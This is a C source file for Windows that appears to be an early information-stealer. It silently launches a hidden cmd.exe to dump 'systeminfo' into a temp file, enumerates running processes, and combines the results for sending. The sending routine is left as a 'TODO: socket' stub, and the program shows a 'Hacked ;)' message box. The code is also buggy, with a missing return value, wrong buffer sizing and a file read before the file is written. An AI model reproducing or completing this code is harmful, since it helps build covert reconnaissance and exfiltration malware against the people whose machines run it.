#include <windows.h>
#include <TlHelp32.h>
#include <stdio.h>
char* get_proc_list();

BOOL data_accumulation();
BOOL send_data();
BOOL write_sys_info();
char* get_data();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char* result = get_data();

	if (send_data())
	{
		MessageBox(NULL, "Send - OK", "Info", MB_ICONINFORMATION);
	}
	else
	{
		MessageBox(NULL, "Unable send data", "Error", MB_ICONERROR);
	}
	return 0;
}

char* get_proc_list()
{
	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	char* procList = (char*)malloc(sizeof(char*) * 2000);
	ZeroMemory(procList, _msize(procList));

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(PROCESSENTRY32);

	while (Process32Next(hProcSnap, &pe32))
	{
		if (strlen(pe32.szExeFile) + _msize(procList) > _msize(procList))
			procList = (char*)realloc(procList, _msize(procList) + 500);
		strcat(procList, pe32.szExeFile);
		strcat(procList, "\r\n");
	}

	CloseHandle(hProcSnap);

	return procList;
}

BOOL data_accumulation()
{
	char *sysinfo, *procList, *result;
	UINT sysInfoLen, procListLen;
	write_sys_info();
	sysinfo = get_data();
	sysInfoLen = strlen(sysinfo);
	procList = get_proc_list();
	procListLen = strlen(procList);

	result = (char*)malloc(sizeof(char*) * (procListLen + sysInfoLen + 100));
	ZeroMemory(result, _msize(result));
	memcpy(result, sysinfo, sysInfoLen);
	memcpy(result + sysInfoLen, procList, procListLen);

	free(sysinfo);
	free(procList);

	if (strlen(result) > 100)
	{
		MessageBox(NULL, "Hacked ;)", "LOL", MB_ICONINFORMATION);
	}
}

BOOL send_data()
{
	// TODO: socket
	return data_accumulation();
}

BOOL write_sys_info()
{
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	memset(&StartupInfo, 0, sizeof(StartupInfo));

	StartupInfo.cb = sizeof(STARTUPINFO);
	StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	StartupInfo.wShowWindow = SW_HIDE;

	if (!CreateProcess(NULL,
	                       "C:\\Windows\\System32\\cmd.exe /C \"chcp 65001 & systeminfo > %TEMP%\\data.txt\"",
	                       NULL,
	                       NULL,
	                       FALSE,
	                       CREATE_NO_WINDOW,
	                       NULL,
	                       NULL,
	                       &StartupInfo,
	                       &ProcessInfo)
	)
		return FALSE;
	return TRUE;
}

char* get_data()
{
	char tempPath[CHAR_MAX ] = {0};
	FILE* file;
	UINT size = 0;
	char* data;
	GetTempPath(CHAR_MAX, tempPath);

	strcat(tempPath, "\\data.txt");
	file = fopen(tempPath, "r");
	fseek(file, 0, SEEK_END);
	size = ftell(file);
	rewind(file);

	data = (char*)malloc(sizeof(char*) * size);
	ZeroMemory(data, _msize(data));
	fread(data, 1, size, file);
	fclose(file);
	return data;
}
